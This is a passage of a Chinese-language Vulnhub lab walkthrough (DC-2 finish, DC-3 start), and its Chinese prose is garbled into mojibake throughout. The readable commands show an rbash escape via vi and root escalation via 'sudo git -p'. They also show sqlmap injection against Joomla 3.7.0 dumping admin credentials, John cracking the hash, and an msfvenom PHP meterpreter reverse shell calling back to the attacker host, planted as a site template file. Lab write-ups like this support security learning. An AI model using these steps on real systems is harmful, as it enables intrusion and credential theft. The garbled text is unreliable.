<p>çœ‹æ¥æ˜¯é™åˆ¶äº†æˆ‘ä»¬çš„å‘½ä»¤ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¾—çŸ¥é“æˆ‘ä»¬ç›®å‰è¿˜èƒ½ç”¨é‚£äº›å‘½ä»¤ï¼Œä¹‹å‰ä½¿ç”¨è¿‡<code>ls</code>ï¼Œæ‰€ä»¥<code>ls</code>å¯ä»¥ä½¿ç”¨</p>
<blockquote>
<p>è¾“å…¥<code>ls /home/tom/usr/bin</code>   </p>
<p>&#x2F;&#x2F;æŸ¥çœ‹rbashè®¾ç½®çš„å¯æ‰§è¡Œçš„å‘½ä»¤</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831232504736.png" alt="image-20220831232504736"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">less <span class="keyword">ls</span> scp <span class="keyword">vi</span></span><br></pre></td></tr></table></figure>

<p>å…³é”®æ˜¯<code>vi</code>çš„å‘½ä»¤</p>
<h3 id="viç»•è¿‡-rbashé€ƒé€¸"><a href="#viç»•è¿‡-rbashé€ƒé€¸" class="headerlink" title="*viç»•è¿‡-&gt;rbashé€ƒé€¸"></a>*viç»•è¿‡-&gt;rbashé€ƒé€¸</h3><p>å¯ä»¥è¿›å…¥<code>vi</code>ä¸­ï¼Œæ‰§è¡Œ<code>set</code>å‘½ä»¤ï¼ŒæŠŠ<code>shell</code>æ”¹ä¸º<code>/bin/sh</code></p>
<blockquote>
<p> å…ˆè¾“å…¥<code>vi</code>ï¼Œè¿›å…¥<code>vi</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831233127692.png" alt="image-20220831233127692"></p>
<p>ç„¶å</p>
<blockquote>
<p>ç›´æ¥è¾“å…¥ï¼Œ<strong>ä¸ç”¨æŒ‰i</strong><br><code>:set shell=/bin/sh</code>    &#x2F;&#x2F;ç»™shellèµ‹å€¼<br>å›è½¦<br><code>:shell</code>                &#x2F;&#x2F;æ‰§è¡Œshell<br>å›è½¦ï¼Œå°±é€€å›ä¸»ç•Œé¢æ¥äº†</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831233626801.png" alt="image-20220831233626801"></p>
<p>è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†é€ƒé€¸</p>
<p>ä¹‹å‰å› ä¸ºæˆ‘ä»¬å—é™äº<code>rbash</code>ï¼Œä¸èƒ½æ‰§è¡Œ<code>cd</code>ç­‰å‘½ä»¤</p>
<p><img src="/post/vulnhub/image-20220831233814113.png" alt="image-20220831233814113"></p>
<p>ç°åœ¨æ‰§è¡Œè¯•è¯•</p>
<p><img src="/post/vulnhub/image-20220831234028674.png" alt="image-20220831234028674"></p>
<p>å°±æ²¡æœ‰é˜»æ­¢äº†</p>
<p>æˆ‘ä»¬å†è¯•è¯•<code>cat</code></p>
<p><img src="/post/vulnhub/image-20220831234235801.png" alt="image-20220831234235801"></p>
<p>å‘ç°<code>cat</code>å‘½ä»¤æ‰¾ä¸åˆ°ï¼Œä½†æ˜¯æˆ‘ä»¬å·²ç»ç»•è¿‡äº†<code>rbash</code>ï¼Œæ‰€ä»¥åªèƒ½æ˜¯å…¶ä»–åŸå› ï¼Œæœ€æœ‰å¯èƒ½å°±æ˜¯<code>cat</code>çš„ç¯å¢ƒæ²¡æœ‰è®¾ç½®åˆ°å½“å‰ä½ç½®</p>
<blockquote>
<p>è¾“å…¥<code>echo $PATH</code><br>è¿™æ˜¯æ˜¾ç¤ºå½“å‰ç¯å¢ƒå˜é‡ï¼Œå¯èƒ½catå¹¶æ²¡æœ‰è¢«è®¾ç½®åˆ°å½“å‰çš„ç¯å¢ƒå˜é‡æ‰€ä»¥æ— æ³•æ‰§è¡Œ</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831234423827.png" alt="image-20220831234423827"></p>
<h3 id="è®¾ç½®å…¨å±€å˜é‡"><a href="#è®¾ç½®å…¨å±€å˜é‡" class="headerlink" title="*è®¾ç½®å…¨å±€å˜é‡"></a>*è®¾ç½®å…¨å±€å˜é‡</h3><blockquote>
<p>äºæ˜¯æˆ‘ä»¬æ¥è®¾ç½®å…¨å±€å˜é‡,ç»ˆç«¯è¾“å…¥<br><code>export PATH=PATH:/usr/local/sbin:/usr/local/bin:usr/sbin:/usr/bin:/bin:sbin</code></p>
</blockquote>
<p>è¿™æ ·æˆ‘ä»¬æ‰§è¡Œ<code>cat</code>å°±ä¸ä¼šåªåœ¨<code>/home/tom/usr/bin</code>é‡Œé¢å¯»æ‰¾äº†ï¼Œä¼šåœ¨å¾ˆå¤šç›®å½•é‡Œå¯»æ‰¾</p>
<blockquote>
<p>è¾“å…¥</p>
<p><code>cd tom</code><br><code>ls</code><br><code>cat flag3.txt</code><br>å¾—åˆ°flag3</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220831235038373.png" alt="image-20220831235038373"></p>
<blockquote>
<p><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</code><br>æ„æ€æ˜¯ï¼š</p>
<p>å¯æ€œçš„è€æ±¤å§†æ€»æ˜¯åœ¨è¿½æ°ç‘ã€‚ä¹Ÿè®¸ä»–åº”è¯¥ä¸ºä»–é€ æˆçš„æ‰€æœ‰å‹åŠ›è´Ÿè´£ã€‚</p>
<p>ä½†æ˜¯çœ‹åˆ°äº†suï¼Œä¹Ÿå°±æ˜¯éœ€è¦åˆ‡æ¢ç”¨æˆ·</p>
</blockquote>
<hr>
<h2 id="Flag4-1"><a href="#Flag4-1" class="headerlink" title="Flag4"></a>Flag4</h2><p>æ ¹æ®<code>flag3</code>ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“éœ€è¦ç”¨<code>su</code>å‘½ä»¤åˆ‡æ¢ç”¨æˆ·åˆ°<code>jerry</code></p>
<blockquote>
<p>è¾“å…¥<code>su jerry</code>å’Œå…¶å¯†ç <code>adipiscing</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220901094337288.png" alt="image-20220901094337288"></p>
<p>ç„¶ååˆ‡æ¢åˆ°<code>jerry</code>ç›®å½•ï¼Œå‘ç°<code>flag4.txt</code></p>
<p><img src="/post/vulnhub/image-20220901094512382.png" alt="image-20220901094512382"></p>
<blockquote>
<p><code>Good to see that you&#39;ve made it this far - but you&#39;re not home yet.</code> </p>
<p><code>You still need to get the final flag (the only flag that really counts!!!).</code>  </p>
<p><code>No hints here - you&#39;re on your own now.  :-)</code></p>
<p><code>Go on - git outta here!!!!</code><br>æ„æ€æ˜¯ï¼š<br>å¾ˆé«˜å…´çœ‹åˆ°ä½ èµ°äº†è¿™ä¹ˆè¿œï¼Œä½†ä½ è¿˜æ²¡å›å®¶ã€‚<br>ä½ ä»ç„¶éœ€è¦å¾—åˆ°æœ€åçš„æ ‡å¿—ï¼ˆå”¯ä¸€çœŸæ­£é‡è¦çš„æ ‡å¿—ï¼ï¼ï¼ï¼‰ã€‚<br>è¿™é‡Œæ²¡æœ‰æç¤º-ä½ ç°åœ¨åªèƒ½é è‡ªå·±äº†ã€‚ï¼š-ï¼‰</p>
<p>å»å§-æ»šå‡ºå»ï¼ï¼ï¼ï¼</p>
<p>çœ‹åˆ°gitï¼Œå°±æ˜¯æç¤ºæˆ‘ä»¬ç”¨gitå‘½ä»¤</p>
</blockquote>
<hr>
<h2 id="Flag5-1"><a href="#Flag5-1" class="headerlink" title="Flag5"></a>Flag5</h2><h3 id="gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´"><a href="#gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´" class="headerlink" title="*gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´"></a>*gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´</h3><blockquote>
<p>è¾“å…¥<code>sudo -l</code><br>&#x2F;&#x2F;åˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220901112624228.png" alt="image-20220901112624228"></p>
<p><u>å°±å¯ä»¥å‘ç°rootä»¥<code>nopasswd</code>ã€ä¸éœ€è¦å¯†ç ã€‘è¿è¡Œ<code>git</code>å‘½ä»¤</u></p>
<p>åŸç†æ˜¯<code>git</code>å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ï¼Œ</p>
<p>åœ¨ä½¿ç”¨</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>ä¸éœ€è¦è¾“å…¥<code>root</code>å¯†ç ï¼Œå³å¯ä»¥<code>root</code>èº«ä»½æ‰§è¡Œè¿™æ¡å‘½ä»¤</p>
<p>æ“ä½œå¦‚ä¸‹</p>
<blockquote>
<p><code>sudo git -p</code>    </p>
<p>&#x2F;&#x2F;-pæ˜¯åˆ†é¡µæŸ¥çœ‹ï¼Œè¿™ä¸ªåŸç†å°±æ˜¯ç»ˆç«¯çš„çª—å£å¤§å°ä¸å¤Ÿæ˜¾ç¤ºï¼Œæ‰€ä»¥ä¸‹æ–¹ä¼šå‡ºç°å†’å·ï¼Œç­‰å¾…è¾“å…¥å‘½ä»¤</p>
</blockquote>
<p>ä¸‹é¢å¯ä»¥çœ‹çœ‹åŒºåˆ«</p>
<h4 id="æ³¨æ„çª—å£å¤§å°"><a href="#æ³¨æ„çª—å£å¤§å°" class="headerlink" title="*æ³¨æ„çª—å£å¤§å°"></a>*æ³¨æ„çª—å£å¤§å°</h4><h5 id="1-çª—å£è¶³å¤Ÿå¤§"><a href="#1-çª—å£è¶³å¤Ÿå¤§" class="headerlink" title="1.çª—å£è¶³å¤Ÿå¤§"></a>1.çª—å£è¶³å¤Ÿå¤§</h5><p><img src="/post/vulnhub/image-20220901113721300.png" alt="image-20220901113721300"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¾ç¤ºå®Œäº†ï¼Œå°±åˆå›åˆ°åŸå¤„äº†ã€ä¸è¡Œã€‘</p>
<h5 id="2-çª—å£å°ä¸€äº›"><a href="#2-çª—å£å°ä¸€äº›" class="headerlink" title="2.çª—å£å°ä¸€äº›"></a>2.çª—å£å°ä¸€äº›</h5><p><img src="/post/vulnhub/image-20220901113851826.png" alt="image-20220901113851826"></p>
<p>ä¸‹æ–¹å°±æ˜¾ç¤ºå‡º:ï¼Œç­‰å¾…è¾“å…¥</p>
<blockquote>
<p>å†’å·<code>:</code>æ˜¯è‡ªå¸¦æœ‰çš„ï¼Œä¸æ˜¯è¾“å…¥çš„<br><code>:!/bin/sh</code></p>
<p>&#x2F;&#x2F;æ„Ÿå¹å·!æ˜¯shellè½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥è¦é¿å…sudoæˆæƒç”¨æˆ·ä½¿ç”¨<code>viï¼Œvimï¼Œftpï¼Œleeï¼Œmoreï¼Œgit</code><br><code>è¿›å…¥root</code></p>
<p><code>cd /root</code></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥æ‰§è¡Œ<code>:!passwd root</code><br>ä¿®æ”¹å…¶å¯†ç <br>ç„¶å<code>su root</code>ç™»å½•ä¹Ÿå¯</p>
</blockquote>
<h3 id="æ³•-1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"><a href="#æ³•-1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell" class="headerlink" title="æ³• 1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"></a>æ³• 1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell</h3><p><code>$</code>å˜æˆ<code>#</code>æˆåŠŸ</p>
<p><img src="/post/vulnhub/image-20220901114902493.png" alt="image-20220901114902493"></p>
<h3 id="æ³•-2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•"><a href="#æ³•-2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•" class="headerlink" title="æ³• 2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•"></a>æ³• 2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•</h3><p><img src="/post/vulnhub/image-20220901114453769.png" alt="image-20220901114453769"></p>
<p><code>$</code>å˜æˆ<code>#</code>ï¼ŒæˆåŠŸç™»å½•</p>
<p><img src="/post/vulnhub/image-20220901114726423.png" alt="image-20220901114726423"></p>
<p>ç„¶ååˆ°<code>/root</code>ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°æœ€åçš„ <code>flag</code></p>
<p><img src="/post/vulnhub/image-20220901115306177.png" alt="image-20220901115306177"></p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">__    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___|<span class="string"> </span>|<span class="string"> </span>|<span class="string">   __</span>|<span class="string"> </span>|<span class="string"> ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ </span>|<span class="string"> </span>|<span class="string">  / _` </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___\/   </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Congratulatons!!!</code></p>
<p><code>A special thanks to all those who sent me tweets</code><br><code>and provided me with feedback - it&#39;s all greatly</code><br><code>appreciated.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code><br>æ„æ€æ˜¯ï¼š</p>
<p>æ­å–œï¼ï¼ï¼</p>
<p>ç‰¹åˆ«æ„Ÿè°¢æ‰€æœ‰ç»™æˆ‘å‘æ¨æ–‡çš„äºº</p>
<p>å¹¶å‘æˆ‘æä¾›äº†åé¦ˆ-éå¸¸æ£’<br>è°¢è°¢ã€‚</p>
<p>å¦‚æœæ‚¨å–œæ¬¢è¿™ä¸ªCTFï¼Œè¯·é€šè¿‡@DCAU7ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡</p>
</blockquote>
<p><strong>5ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1 id="ä¸‰ã€DC-3-åˆçº§"><a href="#ä¸‰ã€DC-3-åˆçº§" class="headerlink" title="ä¸‰ã€DC-3[åˆçº§]"></a>ä¸‰ã€DC-3[åˆçº§]</h1><p><strong>only one flag</strong></p>
<h2 id="ä¿¡æ¯æ”¶é›†-2"><a href="#ä¿¡æ¯æ”¶é›†-2" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ã€å‰é¢çš„é¶æœº<code>ip</code>å¯»æ‰¾ï¼ŒæŒ‰ä¹‹å‰çš„æ­¥éª¤å³å¯ã€‘</p>
<p>å…ˆç”¨<code>nmap</code>æ‰«ä¸€ä¸‹æˆ‘ä»¬çš„é¶æœº<code>ip</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220902123406584.png" alt="image-20220902123406584"></p>
<p>çœ‹åˆ°åªæœ‰<code>80</code>ç«¯å£ï¼Œè¿è¡Œç€ä¸€ä¸ª<code>http</code>æœåŠ¡ï¼Œä¸­é—´ä»¶ä¸º<code>apache2.4.18</code></p>
<p>å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆ<code>CMS</code>ï¼‰æ˜¯<code>joomla</code></p>
<p><img src="/post/vulnhub/image-20220902123056590.png" alt="image-20220902123056590"></p>
<p>åˆ©ç”¨æ’ä»¶<code>wappalyzer</code>ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°å…¶<code>CMS</code>ä¸º<code>joomla</code></p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>kali</code>åŒ…å½“ä¸­è‡ªå¸¦çš„<code>joomscan</code>å·¥å…·å¯¹å…¶è¿›è¡Œæ‰«æ</p>
<blockquote>
<p>æ¼æ´æ‰«æå™¨ï¼ˆJoomScanï¼‰æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯å®ç°æ¼æ´æ£€æµ‹çš„è‡ªåŠ¨åŒ–ï¼Œä»¥å¢å¼ºJoomla CMSå¼€å‘çš„å®‰å…¨æ€§ã€‚è¯¥å·¥å…·åŸºäºPerlå¼€å‘ï¼Œèƒ½å¤Ÿè½»æ¾æ— ç¼åœ°å¯¹å„ç§Joomlaé¡¹ç›®è¿›è¡Œæ¼æ´æ‰«æï¼Œå…¶è½»é‡åŒ–å’Œæ¨¡å—åŒ–çš„æ¶æ„èƒ½å¤Ÿä¿è¯æ‰«æè¿‡ç¨‹ä¸­ä¸ä¼šç•™ä¸‹è¿‡å¤šçš„ç—•è¿¹ã€‚å®ƒä¸ä»…èƒ½å¤Ÿæ£€æµ‹å·²çŸ¥æ¼æ´ï¼Œè€Œä¸”è¿˜èƒ½å¤Ÿæ£€æµ‹åˆ°å¾ˆå¤šé”™è¯¯é…ç½®æ¼æ´å’Œç®¡ç†æƒé™æ¼æ´ç­‰ç­‰ã€‚è¿˜èƒ½å¤Ÿä»¥HTMLæˆ–æ–‡æœ¬æ ¼å¼å¯¼å‡ºæ‰«ææŠ¥å‘Šã€‚</p>
</blockquote>
<p>ã€æ²¡æœ‰çš„ï¼Œå¯èƒ½éœ€è¦æ›´æ–°åŒ…ï¼Œç„¶åç›´æ¥ä¸‹è½½å³å¯ã€‘</p>
<p><img src="/post/vulnhub/image-20220902185529785.png" alt="image-20220902185529785"></p>
<blockquote>
<p>è¾“å…¥<code>joomscan -u 192.168.133.139</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220902185954570.png" alt="image-20220902185954570"></p>
<p>æ‰«æå‘ç°äº†ï¼Œç®¡ç†å‘˜çš„ç™»å½•ç½‘å€<code>http://192.168.133.139/administrator/</code></p>
<p><img src="/post/vulnhub/image-20220902190312468.png" alt="image-20220902190312468"></p>
<p>ä½†æ˜¯ä¸çŸ¥é“ç”¨æˆ·åå’Œå¯†ç </p>
<hr>
<p>å‘ç°å…¶<code>joomla</code>ç‰ˆæœ¬ä¸º<code>3.7.0</code></p>
<p><img src="/post/vulnhub/image-20220902194849302.png" alt="image-20220902194849302"></p>
<p>ä½†æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¯¥ç‰ˆæœ¬æœ‰å“ªäº›æ¼æ´ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ° <code>kali</code>çš„<code>Exploit-DB</code>å·¥å…·</p>
<p>å¯ä»¥åœ¨æµè§ˆå™¨é‡Œçš„<code>Exploit-DB</code>ç½‘å€è¿›è¡ŒæŸ¥è¯¢ã€ä¸è¿‡å› ä¸ºæ˜¯å›½å¤–ç½‘å€æœ‰ç‚¹å¡ã€‘</p>
<p><img src="/post/vulnhub/image-20220902195723987.png" alt="image-20220902195723987"></p>
<p>ç„¶åå¯»æ‰¾ä¸‹è½½payload</p>
<hr>
<p>ä¹Ÿå¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤æŸ¥è¯¢ã€ä¹Ÿæ˜¯åŸºäº<code>Exploit-DB</code>çš„å‘½ä»¤è¡Œæœç´¢å·¥å…·,å¯ä»¥å¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾æ¸—é€æ¨¡å—ã€‘</p>
<blockquote>
<p>è¾“å…¥<code>searchsploit joomla 3.7.0</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903084826356.png" alt="image-20220903084826356"></p>
<p>å¯ä»¥çœ‹åˆ°<code>joomla 3.7.0</code>ç‰ˆæœ¬å­˜åœ¨<code>sqlæ³¨å…¥</code>çš„æ¼æ´</p>
<p> ç„¶åæŸ¥çœ‹<code>Path</code></p>
<blockquote>
<p>è¾“å…¥<code>searchsploit -p 42033</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903124805721.png" alt="image-20220903124805721"></p>
<p><code>Path</code>å°±æ˜¯è¯¥æ¼æ´åˆ©ç”¨æ–¹æ³•çš„æ–‡æœ¬åœ°å€</p>
<blockquote>
<p>è¾“å…¥<code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903125053542.png" alt="image-20220903125053542"></p>
<p>å¯ä»¥çœ‹åˆ°è¯¥æ¼æ´çš„æµ‹è¯•å¹³å°ï¼Œæ—¶é—´ï¼Œè¿˜æœ‰æ¼æ´çš„<code>CVE</code>ç¼–å·</p>
<p>å…³é”®åœ¨å®ƒç»™å‡ºçš„<code>sqlmap</code>æ³¨å…¥çš„æ¨¡æ¿</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
<p>&#x2F;&#x2F;æŠŠlocalhostæ”¹æˆé¶æœºipå³å¯</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903125630036.png" alt="image-20220903125630036"></p>
<p>è¿è¡Œ</p>
<p><img src="/post/vulnhub/image-20220903125921853.png" alt="image-20220903125921853"></p>
<p>å‘ç°äº†é¶æœºä¸‹çš„æ•°æ®åº“ï¼Œæˆ‘ä»¬æ‰€éœ€è¦çš„å°±æ˜¯<code>joomladb</code></p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</code></p>
<p>&#x2F;&#x2F;åœ¨åŸæœ‰çš„payloadååŠ ä¸Š-D joomladbï¼Œé€‰å®šæ•°æ®åº“<br>&#x2F;&#x2F;å†åœ¨åé¢åŠ ä¸Šâ€“tablesï¼Œè¾“å‡ºè¯¥æ•°æ®åº“çš„è¡¨</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903130545749.png" alt="image-20220903130545749"></p>
<p>ç„¶åå¯ä»¥çœ‹åˆ°<code>#__users</code>çš„è¡¨ï¼Œé‡Œé¢å¾ˆå¯èƒ½æœ‰çº¿ç´¢</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns</code></p>
<p>&#x2F;&#x2F;å’Œä¸Šä¸€æ­¥ç±»ä¼¼ï¼Œä½†æ³¨æ„è¡¨åæœ‰#ï¼Œæ‰€ä»¥éœ€è¦ç”¨å¼•å·æ¡†èµ·æ¥ï¼Œä¸ç„¶åé¢è¯­å¥å…¨è¢«æ³¨é‡Šäº†<br>&#x2F;&#x2F;*æ³¨ï¼Œsqlmapæç¤ºæŒ‰é»˜è®¤æ¨èå°±å¥½</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903131111592.png" alt="image-20220903131111592"></p>
<p>çœ‹åˆ°<code>username</code>å’Œ<code>password</code>ï¼ŒæŸ¥çœ‹åˆ—é‡Œå†…å®¹</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump</code><br>&#x2F;&#x2F;dumpè·å–å­—æ®µä¸­çš„æ•°æ®</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903133516906.png" alt="image-20220903133516906"></p>
<p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </p>
<p>ä½†æ˜¯å¯†ç è¢«åŠ å¯†äº†ï¼Œé‚£å°±åªèƒ½ç”¨ä¸€äº›å·¥å…·è¿›è¡Œè§£å¯†</p>
<p>å…ˆç”Ÿæˆä¸€ä¸ªåŠ å¯†å¯†ç çš„æ–‡æœ¬æ–‡ä»¶</p>
<blockquote>
<p>è¾“å…¥<code>vi passwd.txt</code><br>ç„¶åæŠŠåŠ å¯†æ•°æ®å¤åˆ¶è¿›å»<br><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903134307088.png" alt="image-20220903134307088"></p>
<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>ç„¶åæˆ‘ä»¬å°±éœ€è¦ç”¨ä¸€ä¸ªè§£å¯†å·¥å…·<code>john</code></p>
<p><code>John</code>æ˜¯ä¸€ä¸ªç ´è§£ç³»ç»Ÿå¯†ç çš„å·¥å…·</p>
<p>ä½¿ç”¨å¾ˆç®€å•</p>
<blockquote>
<p>è¾“å…¥<code>john passwd.txt</code></p>
<p>&#x2F;&#x2F;åé¢æ¥çš„æ˜¯å¯†ç æ–‡æœ¬æ–‡ä»¶</p>
</blockquote>
<p>ç„¶åè¾“å…¥</p>
<blockquote>
<p><code>john --show passwd.txt</code><br>&#x2F;&#x2F;æŸ¥çœ‹çˆ†ç ´æˆåŠŸçš„å¯†ç ï¼Œå‘ç°çˆ†ç ´æˆåŠŸ</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903140126704.png" alt="image-20220903140126704"></p>
<p>å¾—åˆ°å¯†ç <code>snoopy</code></p>
<p>ç„¶åç™»å½•åå°ç½‘å€</p>
<blockquote>
<p>ç”¨æˆ·åï¼š<code>admin</code><br>å¯†ç ï¼š<code>snoopy</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903140604935.png" alt="image-20220903140604935"></p>
<p>ç™»å½•æˆåŠŸï¼Œç„¶åæ‘¸ç´¢åˆ†æä¸€ä¸‹ç½‘ç«™</p>
<p>ç„¶ååœ¨<code>Extensions</code>â€“&gt;<code>Template</code></p>
<p><img src="/post/vulnhub/image-20220903142609240.png" alt="image-20220903142609240"></p>
<p><img src="/post/vulnhub/image-20220903142440563.png" alt="image-20220903142440563"></p>
<p>å‘ç°æœ‰ä¸ª<code>new file</code>ï¼Œå¯ä»¥æ–°å»ºæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥æ–°å»ºä¸€ä¸ªæˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶ï¼Œæ‹¿å–é¶æœºçš„<code>shell</code></p>
<h2 id="åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell"><a href="#åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell" class="headerlink" title="åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell"></a>åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell</h2><h3 id="æ³•1"><a href="#æ³•1" class="headerlink" title="æ³•1"></a>æ³•1</h3><p><strong>msfvenom</strong></p>
<h4 id="msfç”Ÿæˆæœ¨é©¬"><a href="#msfç”Ÿæˆæœ¨é©¬" class="headerlink" title="msfç”Ÿæˆæœ¨é©¬"></a>msfç”Ÿæˆæœ¨é©¬</h4><blockquote>
<p>è¾“å…¥<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=kaliçš„ip LPORT=4444 -f raw &gt; shell.php</code><br>&#x2F;&#x2F;æ³¨æ„ï¼ŒLHOSTæ˜¯kaliçš„ip</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903222910397.png" alt="image-20220903222910397"></p>
<blockquote>
<p>è¾“å…¥<code>ls</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903144052531.png" alt="image-20220903144052531"></p>
<p>å‘ç°ç›®å½•ä¸‹ç”Ÿæˆäº† <code>shell.php</code></p>
<blockquote>
<p>è¾“å…¥<code>cat shell.php</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220903223007361.png" alt="image-20220903223007361"></p>
<p>å¾—åˆ°é¶æœºå¯¹åº”çš„æœ¨é©¬</p>
<p>ç„¶ååœ¨ç½‘ç«™æ–°å»ºä¸€ä¸ª<code>php</code>æ–‡ä»¶</p>
<p><img src="/post/vulnhub/image-20220903221145987.png" alt="image-20220903221145987"></p>
<p>ç„¶åæŠŠæœ¨é©¬å†…å®¹å¯¼å…¥è¿›å»</p>
<p><img src="/post/vulnhub/image-20220903223039265.png" alt="image-20220903223039265"></p>
<p> ç„¶åä¿å­˜ä¸€ä¸‹</p>
<p><img src="/post/vulnhub/image-20220903221243628.png" alt="image-20220903221243628"></p>
<p>ç„¶åæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°æœ¨é©¬æ–‡ä»¶è·¯å¾„ï¼Œè¿›è¡Œè®¿é—®çœ‹çœ‹ï¼Œèƒ½ä¸èƒ½è®¿é—®æˆåŠŸ</p>
<p>å› ä¸ºæˆ‘ä»¬æ–‡ä»¶æ˜¯åœ¨<code>/templates/protostar/</code>ä¸‹ä¸Šä¼ çš„ï¼Œæ‰€ä»¥è®¿é—®</p>
